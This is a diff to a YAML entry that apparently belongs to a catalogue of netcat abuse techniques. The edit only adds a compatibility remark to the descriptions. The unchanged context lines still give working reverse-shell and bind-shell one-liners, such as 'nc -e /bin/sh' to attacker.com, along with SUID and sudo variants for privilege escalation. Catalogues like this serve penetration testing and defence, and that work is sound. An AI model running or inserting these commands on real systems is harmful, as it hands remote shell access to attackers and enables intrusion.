@@ -1,13 +1,13 @@
 ---
 functions:
   reverse-shell-interactive:
-    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
       code: |
         RHOST=attacker.com
         RPORT=12345
         nc -e /bin/sh $RHOST $RPORT
   bind-shell-interactive:
-    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
+    - description: Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.
       code: |
         LPORT=12345
         nc -l -p $LPORT -e /bin/sh
@@ -25,13 +25,13 @@ functions:
         LFILE=file_to_save
         nc -l -p $LPORT > "$LFILE"
   suid-limited:
-    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
       code: |
         RHOST=attacker.com
         RPORT=12345
         ./nc -e /bin/sh $RHOST $RPORT
   sudo-enabled:
-    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
       code: |
         RHOST=attacker.com
         RPORT=12345
